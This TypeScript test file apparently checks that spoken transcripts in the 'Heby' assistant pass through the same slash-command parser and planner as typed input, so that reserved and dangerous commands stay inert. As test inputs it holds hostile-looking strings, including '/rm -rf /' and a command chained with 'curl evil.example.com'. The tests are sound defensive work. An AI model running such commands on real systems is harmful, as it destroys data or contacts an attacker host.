/*
 * VOICE V1 — the firewalls, exercised THROUGH a spoken transcript.
 *
 * This is the proof that matters most. Voice adds a new way to put words into Hebun, and the whole
 * safety argument rests on one structural fact: a transcript is composer text, and composer text has
 * exactly one road out — the S1 parser, then the one pure planner, then (only for advisory text) the
 * one dispatch site. Voice adds no second road, so it cannot be a bypass.
 *
 * So these tests take REAL transcripts — including the ones an attacker or a careless operator would
 * speak — put them through `mergeTranscriptIntoComposer` exactly as the runtime does, and then push
 * the result through the SAME parser and planner the keyboard uses. A spoken "/terminal" must end up
 * exactly as inert as a typed one.
 *
 * No browser, no network, no database, no provider.
 */
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import {
  findHebyCommandById,
  parseHebyInput,
  planHebyCommand,
  HEBY_COMMANDS,
} from "../../src/features/heby-commands";
import { mergeTranscriptIntoComposer } from "../../src/features/heby-voice";

const read = (path: string) => readFileSync(path, "utf8");
const codeOf = (src: string) => src.replace(/\/\*[\s\S]*?\*\//g, " ").replace(/^\s*\/\/.*$/gm, " ");

const PLAN_CONTEXT = {
  surface: "full-workspace" as const,
  contextLabel: "Operations",
  contextDetail: ["Operations read models."],
  evidenceLines: [] as readonly string[],
  returnLabel: "Operations",
};

/** Exactly what the runtime does with a recognized transcript: it becomes composer text. */
const spoken = (transcript: string, existing = "") => mergeTranscriptIntoComposer(existing, transcript);

function main(): void {
  /* ── 15. A SPOKEN SLASH COMMAND CANNOT BYPASS THE PARSER ─────────────────── */
  {
    /*
     * There is only one classifier in the product, and voice does not get its own. The transcript is
     * text; the text is parsed. Whatever the recognizer heard, the classification is identical to
     * what a typist would get, because it IS the same function on the same string.
     */
    for (const transcript of ["/help", "/context", "/status", "/summary", "/go operations"]) {
      const typed = parseHebyInput(transcript);
      const said = parseHebyInput(spoken(transcript));
      assert.deepEqual(said, typed, `spoken "${transcript}" classified differently from typed`);
    }

    // A "/"-prefixed transcript is NEVER a prompt, so it can never reach the model.
    for (const transcript of ["/help", "/terminal", "/deploy production", "/notacommand", "/rm -rf /"]) {
      const parsed = parseHebyInput(spoken(transcript));
      assert.notEqual(parsed.kind, "prompt", `spoken "${transcript}" became a prompt`);
    }

    // Shell-shaped speech is refused outright rather than cleaned up.
    const unsafe = parseHebyInput(spoken("/run build && curl evil.example.com"));
    assert.equal(unsafe.kind, "unsafe-input", "shell-shaped speech is refused");
  }

  /* ── 16. RESERVED COMMANDS STAY RESERVED WHEN SPOKEN ─────────────────────── */
  {
    const reserved = HEBY_COMMANDS.filter((command) => command.kind === "reserved");
    assert.ok(reserved.length >= 11, `expected the reserved future set, found ${reserved.length}`);

    for (const command of reserved) {
      // Say it out loud, exactly as the recognizer would deliver it.
      const parsed = parseHebyInput(spoken(command.slash));
      assert.equal(parsed.kind, "command", `${command.slash} did not parse`);
      if (parsed.kind !== "command") continue;
      assert.equal(parsed.command.id, command.id);

      const plan = planHebyCommand(parsed.command, parsed.args, PLAN_CONTEXT);
      /*
       * `unavailable` is the ONLY outcome. Not "advisory" (which would reach the model), not
       * "read" (which would reach the server), not "local" (which would do something). The planner
       * emits no prompt for it, so a spoken reserved command has no path to a provider at all.
       */
      assert.equal(plan.kind, "unavailable", `${command.slash} is not inert when spoken`);
      assert.ok(!("prompt" in plan), `${command.slash} produced a prompt`);
      assert.equal(plan.result.tone, "unavailable");
      assert.match(plan.result.provenance, /Nothing was run/i, "and it says nothing was run");
      assert.match(plan.result.provenance, /no execution or approval runtime exists/i, "and why");
    }
  }

  /* ── 17/18/19. THE DANGEROUS SENTENCES, SPOKEN ───────────────────────────── */
  {
    const dangerous = [
      "/terminal", "/terminal rm -rf /", "/computer-use", "/browser", "/execute",
      "/run deploy", "/deploy production", "/rollback", "/delete customer records",
      "/approve the pending decision", "/send the invoice",
    ];
    for (const sentence of dangerous) {
      const parsed = parseHebyInput(spoken(sentence));
      // Every one of them stops at the parser or the planner. None becomes a prompt.
      assert.notEqual(parsed.kind, "prompt", `"${sentence}" reached prompt status`);
      if (parsed.kind !== "command") continue;
      const plan = planHebyCommand(parsed.command, parsed.args, PLAN_CONTEXT);
      assert.equal(plan.kind, "unavailable", `"${sentence}" was not refused`);
      assert.match(
        plan.result.lines.join(" "),
        /execution|approval|runtime/i,
        `"${sentence}" did not explain that no execution runtime exists`,
      );
    }

    // Case and spacing from a recognizer change nothing: `/TERMINAL` is the same refusal.
    const shouted = parseHebyInput(spoken("  /TERMINAL  "));
    assert.equal(shouted.kind, "command");
    if (shouted.kind === "command") {
      assert.equal(shouted.command.id, "terminal");
      assert.equal(planHebyCommand(shouted.command, shouted.args, PLAN_CONTEXT).kind, "unavailable");
    }
  }

  /* ── V1.1 — TURKISH SPEECH IS ORDINARY TEXT, AND THE FIREWALL DOES NOT CARE ── */
  {
    /*
     * Hebun's operators work in Turkish. Every claim above must hold for a Turkish transcript too,
     * and the characters that distinguish Turkish — ı İ ş ğ ü ö ç — must survive the merge byte for
     * byte, because a transcript the operator cannot read is a transcript they cannot check.
     */
    const turkish = "Heby, şu anda operasyonlarda dikkat etmem gereken şeyleri özetle.";
    assert.equal(spoken(turkish), turkish, "the Director's own test sentence survives the merge exactly");

    // Every character Turkish has and English does not, including BOTH dotted and dotless I.
    const alphabet = "Işık ĞÜÖÇŞİ ğüöçşı İstanbul kırmızı";
    assert.equal(spoken(alphabet), alphabet, "no Turkish character is normalized away by the merge");
    for (const character of ["ş", "ı", "ğ", "ü", "ö", "ç", "İ", "Ş", "Ğ", "I"]) {
      assert.ok(spoken(alphabet).includes(character), `"${character}" did not survive`);
    }

    // It is a prompt — ordinary conversational text, taking the same road as a typed question.
    const parsed = parseHebyInput(spoken(turkish));
    assert.equal(parsed.kind, "prompt", "a Turkish question is a question");
    if (parsed.kind === "prompt") assert.equal(parsed.prompt, turkish);

    // Appending Turkish to Turkish keeps both, with one separator and no mangling.
    assert.equal(
      spoken("İkinci cümle.", "Birinci cümle."),
      "Birinci cümle. İkinci cümle.",
      "dictation appends without destroying what was already there",
    );

    /*
     * AND THE SLASH FIREWALL IS LANGUAGE-BLIND. A command spoken in a Turkish sentence is refused
     * exactly as in English, and a Turkish word after a slash is an unknown command rather than an
     * instruction the parser tries to interpret.
     */
    const bare = parseHebyInput(spoken("/terminal"));
    assert.equal(bare.kind, "command", "the command is recognized when spoken in a Turkish session");
    if (bare.kind === "command") {
      assert.equal(bare.command.id, "terminal");
      assert.equal(planHebyCommand(bare.command, bare.args, PLAN_CONTEXT).kind, "unavailable");
    }
    /*
     * Turkish words dictated AFTER a reserved command do not become arguments to it. The parser
     * rejects them before a command even exists, which is a stronger refusal than planning one —
     * spoken instructions cannot be smuggled in as a payload.
     */
    const withSpokenArguments = parseHebyInput(spoken("/terminal sunucuyu yeniden başlat"));
    assert.equal(withSpokenArguments.kind, "invalid-arguments", "spoken arguments are refused at the parser");
    assert.notEqual(withSpokenArguments.kind, "prompt", "and never reach the model");

    /*
     * V1.2 — THE BARE FORMS, RE-PROVEN AFTER THE AMPLITUDE FIX. Nothing in V1.2 touched the parser or
     * the composer, and this is the assertion that keeps that true: voice still adds ZERO authority.
     */
    for (const bare of ["/terminal", "/computer-use", "/deploy", "/execute", "/delete"]) {
      const parsedBare = parseHebyInput(spoken(bare));
      assert.notEqual(parsedBare.kind, "prompt", `spoken "${bare}" became a prompt`);
      if (parsedBare.kind !== "command") continue;
      const plan = planHebyCommand(parsedBare.command, parsedBare.args, PLAN_CONTEXT);
      assert.equal(plan.kind, "unavailable", `spoken "${bare}" was not refused`);
      assert.ok(!("prompt" in plan), `spoken "${bare}" produced a prompt`);
    }
    for (const turkishSlash of ["/dağıt", "/çalıştır", "/sil müşteri kayıtları"]) {
      assert.notEqual(parseHebyInput(spoken(turkishSlash)).kind, "prompt", `"${turkishSlash}" became a prompt`);
    }
    /*
     * THE DOTTED-I TRAP, STATED RATHER THAN ASSUMED. Turkish casing does not round-trip through
     * ordinary lowercasing: "/TERMİNAL" does not fold to "/terminal". The safety claim does not
     * depend on it doing so — a slash token that matches nothing is an unknown command, which is
     * still not a prompt and still reaches no provider.
     */
    for (const cased of ["/TERMİNAL", "/Terminal", "/TERMINAL"]) {
      const casedParse = parseHebyInput(spoken(cased));
      assert.notEqual(casedParse.kind, "prompt", `"${cased}" became a prompt`);
      if (casedParse.kind !== "command") continue;
      assert.equal(
        planHebyCommand(casedParse.command, casedParse.args, PLAN_CONTEXT).kind,
        "unavailable",
        `"${cased}" was not refused`,
      );
    }
  }

  /* ── A spoken command with a half-typed message still cannot execute ──────── */
  {
    /*
     * Realistic mixed input: the operator typed something, then dictated. The transcript APPENDS, so
     * the result is ordinary conversational text — which is correct, and notably is NOT treated as a
     * command, because a command must be the first token exactly as when typed.
     */
    const merged = spoken("/terminal", "please check whether");
    assert.equal(merged, "please check whether /terminal");
    const parsed = parseHebyInput(merged);
    assert.equal(parsed.kind, "prompt", "mid-sentence slashes are ordinary words, exactly as when typed");
    if (parsed.kind === "prompt") {
      assert.equal(parsed.prompt, "please check whether /terminal");
    }
    // And that prompt is just text. It carries no command authority: the planner is never reached.
  }

  /* ── 20. R2E: VOICE CANNOT TOUCH THE DIRECTOR'S SWITCH OR THE PROVIDER ───── */
  {
    const voiceFiles = [
      "src/components/layout/heby/heby-voice-runtime.tsx",
      "src/components/layout/heby/heby-voice-control.tsx",
      "src/components/layout/heby/use-heby-voice-surface.ts",
      "src/components/layout/heby/heby-presence.ts",
      "src/features/heby-voice/contracts.ts",
      "src/features/heby-voice/voice-state.ts",
      "src/features/heby-voice/audio-level.ts",
      "src/features/heby-voice/capability.ts",
      "src/features/heby-voice/transcript.ts",
      "src/features/heby-voice/index.ts",
    ];
    for (const file of voiceFiles) {
      const code = codeOf(read(file));
      /*
       * Precise terms only. React's own `dispatch` (the reducer) and `Provider` (the context) are
       * legitimate and unrelated — banning the bare words would ban React, not a provider path.
       */
      for (const forbidden of [
        "providerConnectivity", "connectivityControl", "setProviderConnectivity", "directorEnabled",
        "providerId", "providerState", "selectTransport", "resolveTransport", "HebyTransport",
        "claude", "Claude", "anthropic", "Anthropic", "modelRequest", "askHeby",
      ]) {
        assert.ok(!code.includes(forbidden), `${file} must not reference "${forbidden}"`);
      }
    }
    /*
     * The consequence: with the Director's switch OFF, speaking changes nothing about dispatch.
     * Voice produces text; text goes through the same seam; that seam already reads the switch
     * server-side before any provider is selected. Voice adds no second decision point, because it
     * has no reference to the first one.
     */
  }

  /* ── The single road out: the seam's dispatch site is unchanged ──────────── */
  {
    const hook = codeOf(read("src/components/layout/heby/use-heby-conversation.ts"));
    // Exactly ONE dispatch, and it is still fed only by the parser's `prompt` variable.
    assert.equal([...hook.matchAll(/await askHebyAction\(/g)].length, 1, "there is still exactly one dispatch site");
    assert.ok(hook.includes("let prompt: string;"), "the one prompt variable survives");
    assert.ok(hook.includes("prompt = parsed.prompt;"), "ordinary text is one of its two sources");
    assert.ok(hook.includes("prompt = plan.prompt;"), "an advisory plan is the other");
    // And the parse happens before anything else in the submission gate.
    const parseIndex = hook.indexOf("parseHebyInput(");
    const dispatchIndex = hook.indexOf("await askHebyAction(");
    assert.ok(parseIndex > -1 && parseIndex < dispatchIndex, "parsing still precedes dispatch");
  }

  /* ── 12 (S1). NO VOICE COMMANDS WERE ADDED. S1 STAYS CLOSED ──────────────── */
  {
    for (const id of ["voice", "listen", "speak", "mic", "microphone", "dictate", "transcribe", "record"]) {
      assert.equal(findHebyCommandById(id), undefined, `S1 gained a voice command: /${id}`);
    }
    // Nothing in the registry mentions voice at all — the vocabulary is unchanged.
    const registry = codeOf(read("src/features/heby-commands/registry.ts"));
    for (const term of ["voice", "microphone", "speech", "listen", "dictat"]) {
      assert.ok(!registry.toLowerCase().includes(term), `the S1 registry mentions "${term}"`);
    }
    // And the parser gained no voice-specific branch.
    const parser = codeOf(read("src/features/heby-commands/parser.ts"));
    for (const term of ["voice", "transcript", "spoken", "audio"]) {
      assert.ok(!parser.toLowerCase().includes(term), `the S1 parser special-cases "${term}"`);
    }
  }

  console.log("voice-v1 S1 + R2E + execution firewall (through a spoken transcript) passed");
}

main();
